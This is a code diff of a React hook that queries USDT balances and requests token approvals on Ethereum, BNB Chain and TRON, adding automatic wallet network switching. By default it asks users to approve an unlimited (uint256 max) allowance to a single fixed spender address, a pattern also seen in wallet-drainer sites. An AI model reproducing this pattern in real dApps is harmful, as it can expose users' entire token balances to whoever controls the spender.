@@ -1,11 +1,14 @@
 import { useState, useCallback, useEffect } from 'react';
 import { allowanceService, validateFixedSpender, getFixedSpender } from '../services/blockchain/allowanceService';
 import { TOKEN_CONFIGS } from '../services/blockchain/tokenService';
+import { switchEvmNetwork, normalizeChainId } from '../utils/networkUtils';
+import { EVM_CHAIN_CONFIG } from '../config/blockchainConfig';
 
 export type TxState =
   | 'Idle'
   | 'Preparing'
   | 'Waiting for Wallet'
+  | 'Switching Network'
   | 'Submitted'
   | 'Confirming'
   | 'Confirmed'
@@ -15,7 +18,7 @@ export type TxState =
 
 interface UseTokenAllowanceProps {
   owner: string;
-  network: 'BNB' | 'TRON' | null;
+  network: 'ETH' | 'BNB' | 'TRON' | null;
   chainId: number | null;
 }
 
@@ -41,19 +44,13 @@ export const useTokenAllowance = ({ owner, network, chainId }: UseTokenAllowance
 
     setError('');
     try {
-      if (network === 'BNB') {
-        if (!chainId) return;
-        if (chainId !== 56) {
-          setTxState('Wrong Network');
-          return;
-        }
-
-        const bal = await allowanceService.getEvmBalance(owner, 56);
-        const allow = await allowanceService.getEvmAllowance(owner, spender, 56);
+      if (network === 'ETH' || network === 'BNB') {
+        const targetChainId = network === 'ETH' ? 1 : 56;
+        const bal = await allowanceService.getEvmBalance(owner, targetChainId);
+        const allow = await allowanceService.getEvmAllowance(owner, spender, targetChainId);
         setBalance(bal);
         setAllowance(allow);
       } else if (network === 'TRON') {
-        // TRON Mainnet USDT Contract Address
         const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const bal = await allowanceService.getTronBalance(owner, usdtAddress);
         const allow = await allowanceService.getTronAllowance(owner, spender, usdtAddress);
@@ -64,7 +61,7 @@ export const useTokenAllowance = ({ owner, network, chainId }: UseTokenAllowance
       console.error("Error fetching balance/allowance:", err);
       setError(err.message || "Failed to query blockchain state.");
     }
-  }, [owner, network, chainId]);
+  }, [owner, network]);
 
   // Re-fetch on target changes
   useEffect(() => {
@@ -86,14 +83,26 @@ export const useTokenAllowance = ({ owner, network, chainId }: UseTokenAllowance
     setTxHash('');
 
     try {
-      if (network === 'BNB') {
-        if (!chainId || chainId !== 56) {
-          setTxState('Wrong Network');
-          throw new Error("Wrong network connected. Please connect to BNB Smart Chain.");
+      if (network === 'ETH' || network === 'BNB') {
+        const requiredChainId = network === 'ETH' ? 1 : 56;
+        
+        // Dynamic Network Switching
+        if (!chainId || chainId !== requiredChainId) {
+          setTxState('Switching Network');
+          try {
+            await switchEvmNetwork(requiredChainId, EVM_CHAIN_CONFIG[network]);
+            // Verify switch was successful
+            const newChainHex = await window.ethereum.request({ method: 'eth_chainId' });
+            if (normalizeChainId(newChainHex) !== requiredChainId) {
+              throw new Error(`Failed to switch to ${EVM_CHAIN_CONFIG[network].displayName}`);
+            }
+          } catch (switchErr: any) {
+            setTxState('Wrong Network');
+            throw new Error(`Switch to ${EVM_CHAIN_CONFIG[network].displayName} was cancelled or failed.`);
+          }
         }
 
-        const config = TOKEN_CONFIGS[56];
-        // If customAmount is empty/undefined, set to unlimited (uint256 max)
+        const config = TOKEN_CONFIGS[requiredChainId];
         const decimals = config.decimals;
         const amountBigInt = customAmount 
           ? BigInt(Math.floor(parseFloat(customAmount) * 10 ** decimals)) 
@@ -116,7 +125,6 @@ export const useTokenAllowance = ({ owner, network, chainId }: UseTokenAllowance
           setTxHash(tx);
           setTxState('Submitted');
           
-          // Poll transaction receipt
           setTxState('Confirming');
           let receipt = null;
           while (!receipt) {
@@ -141,10 +149,9 @@ export const useTokenAllowance = ({ owner, network, chainId }: UseTokenAllowance
         const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const contract = await window.tronWeb.contract().at(usdtAddress);
         
-        // TRON USDT decimals: 6
         const amountSun = customAmount 
           ? Math.floor(parseFloat(customAmount) * 1e6).toString()
-          : "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // uint256 max
+          : "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
         setTxState('Waiting for Wallet');
         const tx = await contract.approve(spender, amountSun).send();
@@ -154,7 +161,6 @@ export const useTokenAllowance = ({ owner, network, chainId }: UseTokenAllowance
           setTxState('Submitted');
           
           setTxState('Confirming');
-          // Wait for confirmation on TRON (can take 3-5 seconds)
           await new Promise(res => setTimeout(res, 5000));
           setTxState('Confirmed');
           fetchState();
@@ -165,7 +171,7 @@ export const useTokenAllowance = ({ owner, network, chainId }: UseTokenAllowance
       if (err.message && (err.message.includes("User rejected") || err.message.includes("declined"))) {
         setTxState('Rejected');
       } else {
-        setTxState('Failed');
+        if (txState !== 'Wrong Network') setTxState('Failed');
         setError(err.message || "Approval transaction failed.");
       }
     }
